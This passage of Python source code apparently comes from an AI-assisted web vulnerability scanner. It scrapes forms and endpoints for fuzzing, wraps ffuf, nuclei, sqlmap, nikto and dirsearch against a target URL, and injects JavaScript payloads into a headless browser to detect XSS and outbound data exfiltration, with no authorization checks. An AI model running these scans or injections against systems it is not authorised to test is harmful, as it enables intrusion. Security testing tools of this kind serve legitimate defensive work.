        """Extract form fields, endpoints, and methods for fuzzing."""
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                res = await client.get(url)
                html_text = res.text
            
            forms = []
            # Simple regex-based form extraction
            form_pattern = r'<form[^>]*?(?:action=["\']([^"\']*)["\'])?(?:[^>]*?method=["\']([^"\']*)["\'])?[^>]*?>(.*?)</form>'
            
            for match in re.finditer(form_pattern, html_text, re.IGNORECASE | re.DOTALL):
                action = match.group(1) or ""
                method = match.group(2) or "GET"
                form_body = match.group(3)
                
                # Extract input fields
                fields = []
                input_pattern = r'<(?:input|textarea|select)[^>]*?(?:name=["\']([^"\']*)["\'])?[^>]*?(?:type=["\']([^"\']*)["\'])?'
                for inp_match in re.finditer(input_pattern, form_body, re.IGNORECASE):
                    field_name = inp_match.group(1) or "unnamed"
                    field_type = inp_match.group(2) or "text"
                    fields.append({"name": field_name, "type": field_type})
                
                forms.append({
                    "action": action,
                    "method": method.upper(),
                    "fields": fields,
                    "full_url": action if action.startswith("http") else url.rstrip("/") + "/" + action.lstrip("/")
                })
            
            return forms
        except Exception as e:
            return [{"error": str(e)}]

    @classmethod
    async def extract_endpoints(cls, url: str) -> List[str]:
        """Find all hyperlinks and API endpoints mentioned in HTML."""
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                res = await client.get(url)
                html_text = res.text
            
            endpoints = []
            
            # Extract href links
            link_pattern = r'href=["\']([^"\']*)["\']'
            for match in re.finditer(link_pattern, html_text, re.IGNORECASE):
                link = match.group(1)
                if link and not link.startswith("#"):
                    endpoints.append(link)
            
            # Extract API calls (common patterns)
            api_pattern = r'(?:fetch|XMLHttpRequest|axios|\.get|\.post)\s*\(\s*["\']([^"\']*)["\']'
            for match in re.finditer(api_pattern, html_text, re.IGNORECASE):
                endpoint = match.group(1)
                if endpoint:
                    endpoints.append(endpoint)
            
            # Deduplicate
            endpoints = list(dict.fromkeys(endpoints))
            return endpoints
        except Exception as e:
            return [f"Error: {str(e)}"]

    @classmethod
    async def extract_metadata(cls, url: str) -> Dict:
        """Extract meta tags, title, OG tags for reconnaissance."""
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                res = await client.get(url)
                html_text = res.text
            
            metadata = {
                "title": "",
                "description": "",
                "og_title": "",
                "og_description": "",
                "og_image": "",
                "keywords": "",
                "author": "",
                "charset": "",
            }
            
            # Extract title
            title_match = re.search(r'<title[^>]*>([^<]*)</title>', html_text, re.IGNORECASE)
            if title_match:
                metadata["title"] = title_match.group(1).strip()
            
            # Extract meta tags
            meta_patterns = {
                "description": r'<meta[^>]*?name=["\']description["\'][^>]*?content=["\']([^"\']*)["\']',
                "keywords": r'<meta[^>]*?name=["\']keywords["\'][^>]*?content=["\']([^"\']*)["\']',
                "author": r'<meta[^>]*?name=["\']author["\'][^>]*?content=["\']([^"\']*)["\']',
                "charset": r'<meta[^>]*?charset=["\']?([^"\'\s>]*)',
                "og_title": r'<meta[^>]*?property=["\']og:title["\'][^>]*?content=["\']([^"\']*)["\']',
                "og_description": r'<meta[^>]*?property=["\']og:description["\'][^>]*?content=["\']([^"\']*)["\']',
                "og_image": r'<meta[^>]*?property=["\']og:image["\'][^>]*?content=["\']([^"\']*)["\']',
            }
            
            for key, pattern in meta_patterns.items():
                match = re.search(pattern, html_text, re.IGNORECASE)
                if match:
                    metadata[key] = match.group(1).strip()
            
            return metadata
        except Exception as e:
            return {"error": str(e)}

    @classmethod
    async def extract_text_content(cls, url: str, max_length: int = 5000) -> str:
        """Extract plain text content from HTML, removing tags."""
        try:
            async with httpx.AsyncClient(verify=False, timeout=5) as client:
                res = await client.get(url)
                html_text = res.text
            
            # Remove script and style
            html_text = re.sub(r"<script.*?>.*?</script>", "", html_text, flags=re.IGNORECASE | re.DOTALL)
            html_text = re.sub(r"<style.*?>.*?</style>", "", html_text, flags=re.IGNORECASE | re.DOTALL)
            
            # Remove HTML tags
            html_text = re.sub(r"<[^>]+>", "", html_text)
            
            # Decode HTML entities
            html_text = html.unescape(html_text)
            
            # Collapse whitespace
            html_text = re.sub(r"\s+", " ", html_text)
            
            return html_text.strip()[:max_length]
        except Exception as e:
            return f"Error: {str(e)}"


# ═══════════════════════════════════════════════════════════════════════
# Tool 6: ToolsIntegrator — Real external tool wrappers with smart detection
# ═══════════════════════════════════════════════════════════════════════

class ToolsIntegrator:
    """Wraps external CLI tools to allow the AI to 'confirm' using them."""

    # Tool availability cache
    _tool_cache = {}

    @classmethod
    def check_tool_available(cls, tool_name: str) -> bool:
        """Check if a tool is installed and in PATH."""
        if tool_name in cls._tool_cache:
            return cls._tool_cache[tool_name]
        
        try:
            result = subprocess.run(
                [tool_name, "--version"],
                capture_output=True,
                timeout=2,
                text=True
            )
            available = result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            available = False
        
        cls._tool_cache[tool_name] = available
        return available

    @classmethod
    def run_ffuf(cls, target_url: str, wordlist: str = "common.txt", max_results: int = 50) -> Dict:
        """Run ffuf for directory/endpoint discovery asynchronously via subprocess."""
        if not cls.check_tool_available("ffuf"):
            return {"error": "ffuf not installed. Install with: cargo install ffuf", "tool": "ffuf"}
        
        try:
            cmd = [
                "ffuf",
                "-u", f"{target_url}/FUZZ",
                "-w", wordlist,
                "-mc", "200,301,302,401,403",
                "-t", "10",
                "-o", "json",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                try:
                    output = json.loads(result.stdout)
                    results = output.get("results", [])[:max_results]
                    return {
                        "tool": "ffuf",
                        "discovered_endpoints": len(results),
                        "endpoints": [r.get("url", "") for r in results],
                        "raw": result.stdout[:1000]
                    }
                except json.JSONDecodeError:
                    return {"tool": "ffuf", "raw_output": result.stdout[:500]}
            return {"error": result.stderr, "tool": "ffuf"}
        except Exception as e:
            return {"error": str(e), "tool": "ffuf"}

    @classmethod
    def run_nuclei(cls, target_url: str, tags: str = "cve,sqli,xss") -> Dict:
        """Run nuclei for vulnerability template matching."""
        if not cls.check_tool_available("nuclei"):
            return {"error": "nuclei not installed. Install from: https://nuclei.projectdiscovery.io", "tool": "nuclei"}
        
        try:
            cmd = [
                "nuclei",
                "-u", target_url,
                "-tags", tags,
                "-silent",
                "-json",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.stdout:
                vulns = []
                for line in result.stdout.strip().split("\n"):
                    if line.strip():
                        try:
                            vulns.append(json.loads(line))
                        except json.JSONDecodeError:
                            pass
                
                return {
                    "tool": "nuclei",
                    "vulnerabilities_found": len(vulns),
                    "vulnerabilities": vulns[:10],
                }
            return {"tool": "nuclei", "message": "No vulnerabilities found"}
        except Exception as e:
            return {"error": str(e), "tool": "nuclei"}

    @classmethod
    def run_sqlmap(cls, url: str, param: str = "", level: int = 1) -> Dict:
        """Run sqlmap for thorough SQL injection testing."""
        if not cls.check_tool_available("sqlmap"):
            return {"error": "sqlmap not installed. Install with: pip install sqlmap", "tool": "sqlmap"}
        
        try:
            cmd = [
                "sqlmap",
                "-u", url,
                "--batch",
                f"--level={level}",
                "--risk=1",
                "-v", "0",
                "--json-file=/tmp/sqlmap_out.json"
            ]
            if param:
                cmd.extend(["-p", param])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            # Try to parse JSON output
            try:
                with open("/tmp/sqlmap_out.json", "r") as f:
                    data = json.load(f)
                    return {
                        "tool": "sqlmap",
                        "injectable_params": data.get("injectable", []),
                        "raw": str(data)[:500]
                    }
            except:
                pass
            
            return {
                "tool": "sqlmap",
                "raw_output": result.stdout[:500] if result.stdout else "No output"
            }
        except Exception as e:
            return {"error": str(e), "tool": "sqlmap"}

    @classmethod
    def run_nikto(cls, url: str) -> Dict:
        """Run nikto for web server fingerprinting and vulnerability scanning."""
        if not cls.check_tool_available("nikto"):
            return {"error": "nikto not installed. Install from: https://cirt.net/nikto2", "tool": "nikto"}
        
        try:
            cmd = [
                "nikto",
                "-h", url,
                "-o", "/tmp/nikto_out.json",
                "-Format", "json",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            try:
                with open("/tmp/nikto_out.json", "r") as f:
                    data = json.load(f)
                    items = data.get("vulnerabilities", [])[:20]
                    return {
                        "tool": "nikto",
                        "vulnerabilities_found": len(items),
                        "vulnerabilities": items,
                    }
            except:
                pass
            
            return {"tool": "nikto", "raw_output": result.stdout[:500]}
        except Exception as e:
            return {"error": str(e), "tool": "nikto"}

    @classmethod
    def run_dirsearch(cls, url: str, wordlist: str = "common.txt") -> Dict:
        """Run dirsearch for directory enumeration."""
        if not cls.check_tool_available("dirsearch"):
            return {"error": "dirsearch not installed. Install with: pip install dirsearch", "tool": "dirsearch"}
        
        try:
            cmd = [
                "dirsearch",
                "-u", url,
                "-w", wordlist,
                "-t", "25",
                "-q",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            # Parse output for discovered paths
            paths = []
            for line in result.stdout.split("\n"):
                if any(status in line for status in ["200", "301", "302", "401", "403"]):
                    paths.append(line.strip())
            
            return {
                "tool": "dirsearch",
                "paths_discovered": len(paths),
                "paths": paths[:20],
            }
        except Exception as e:
            return {"error": str(e), "tool": "dirsearch"}

    @classmethod
    def get_tool_status(cls) -> Dict[str, bool]:
        """Get status of all supported tools."""
        tools = ["ffuf", "nuclei", "sqlmap", "nikto", "dirsearch"]
        return {tool: cls.check_tool_available(tool) for tool in tools}


# ═══════════════════════════════════════════════════════════════════════
# Tool 7: SiteImager — Visual context for Vision AI + Advanced XSS Detection
# ═══════════════════════════════════════════════════════════════════════

class SiteImager:
    """Takes headless screenshots and intercepts JS events to objectively prove XSS and other exploits."""

    @classmethod
    async def get_screenshot_base64(cls, url: str, timeout_ms: int = 10000) -> dict:
        """
        Capture a screenshot of a URL with XSS and exfiltration detection.
        Listens for JS alerts and network activity to definitively prove exploitation!
        
        Returns a dictionary with:
        - 'image_base64': Base64 encoded screenshot
        - 'xss_found': bool - whether JS alert was triggered
        - 'alert_text': the alert message
        - 'network_requests': suspicious network activity
        - 'console_logs': captured console output
        """
        result = {
            "image_base64": "",
            "xss_found": False,
            "alert_text": "",
            "network_requests": [],
            "console_logs": [],
            "error": ""
        }
        
        if async_playwright is None:
            result["error"] = "playwright not installed. Install with: pip install playwright && playwright install"
            return result
            
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                
                # Capture network requests (data exfiltration detection)
                network_requests = []
                async def handle_route(route):
                    network_requests.append({
                        "url": route.request.url,
                        "method": route.request.method,
                    })
                    await route.continue_()
                
                await page.route("**/*", handle_route)

                # XSS Detection: Listen for unexpected JS alerts (Proof of XSS!)
                async def handle_dialog(dialog):
                    result["xss_found"] = True
                    result["alert_text"] = dialog.message
                    await dialog.accept()

                page.on("dialog", handle_dialog)
                
                # Console message capture
                def handle_console(msg):
                    result["console_logs"].append({
                        "type": msg.type,
                        "text": msg.text,
                    })
                
                page.on("console", handle_console)

                try:
                    await page.goto(url, timeout=timeout_ms, wait_until="networkidle")
                except:
                    pass  # Page might not load but we can still screenshot
                
                # Wait a bit for any async XSS to trigger
                await page.wait_for_timeout(1000)
                
                screenshot_bytes = await page.screenshot(type="jpeg", quality=70)
                await browser.close()
                
                result["image_base64"] = base64.b64encode(screenshot_bytes).decode('utf-8')
                result["network_requests"] = network_requests[:10]
                
                return result
        except Exception as e:
            result["error"] = f"Error capturing screenshot: {str(e)}"
            return result

    @classmethod
    async def detect_xss_via_console(cls, url: str, payload: str) -> Dict:
        """
        Inject payload and monitor console for exfiltration evidence.
        Returns dict with 'xss_found', 'console_output', etc.
        """
        result = {
            "xss_found": False,
            "payload_injected": payload,
            "console_output": [],
            "alerts": [],
            "error": ""
        }
        
        if async_playwright is None:
            result["error"] = "playwright not installed"
            return result
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                
                console_logs = []
                alerts = []
                
                def handle_console(msg):
                    console_logs.append(msg.text)
                
                async def handle_dialog(dialog):
                    alerts.append(dialog.message)
                    await dialog.accept()
                
                page.on("console", handle_console)
                page.on("dialog", handle_dialog)
                
                try:
                    await page.goto(url, timeout=5000, wait_until="networkidle")
                except:
                    pass
                
                # Inject payload
                try:
                    await page.evaluate(f"() => {{ {payload} }}")
                except:
                    pass
                
                # Wait for async operations
                await page.wait_for_timeout(2000)
                
                result["console_output"] = console_logs
                result["alerts"] = alerts
                result["xss_found"] = len(alerts) > 0 or len(console_logs) > 0
                
                await browser.close()
        except Exception as e:
            result["error"] = str(e)
        
        return result

    @classmethod
    async def detect_exfiltration(cls, url: str, payload: str, duration_ms: int = 5000) -> Dict:
        """
        Monitor network requests while injecting payload for data exfiltration evidence.
        Returns dict with suspicious network activity.
        """
        result = {
            "payload_injected": payload,
            "network_requests": [],
            "suspicious_requests": [],
            "error": ""
        }
        
        if async_playwright is None:
            result["error"] = "playwright not installed"
            return result
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                
                requests = []
                
                async def handle_route(route):
                    requests.append({
                        "url": route.request.url,
                        "method": route.request.method,
                        "post_data": route.request.post_data or "",
                    })
                    await route.continue_()
                
                await page.route("**/*", handle_route)
                
                try:
                    await page.goto(url, timeout=5000, wait_until="networkidle")
                except:
                    pass
                
                # Inject payload
                try:
                    await page.evaluate(f"() => {{ {payload} }}")
                except:
                    pass
                
                # Monitor for suspicious outbound requests
                await page.wait_for_timeout(duration_ms)
                
                result["network_requests"] = requests
                
                # Flag suspicious requests (to external hosts, with exfiltrated data)
                for req in requests:
                    if "127.0.0.1" not in req["url"] and "localhost" not in req["url"]:
                        if req["post_data"] or req["method"] == "POST":
                            result["suspicious_requests"].append(req)
                
                await browser.close()
        except Exception as e:
            result["error"] = str(e)
        
        return result
